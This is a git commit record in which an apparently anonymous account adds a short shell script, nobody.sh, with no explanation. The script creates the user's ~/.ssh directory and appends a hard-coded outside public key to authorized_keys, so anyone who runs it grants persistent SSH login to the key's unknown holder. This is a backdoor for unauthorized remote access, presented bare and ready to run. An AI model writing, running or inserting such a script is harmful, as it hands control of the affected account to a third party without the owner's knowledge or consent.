121fa6e1795dee2f78a62b25353dd2826d99c263
nobody012358 <nobody012358@proton.me>
2025-12-16 13:50:45 +0000

    Add files via upload

---
+++ nobody.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMILXcDeMtCJGYHMJrYvKjztdbjYcFXZ48bnekgFsKhl de_mirage@mirage.com" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
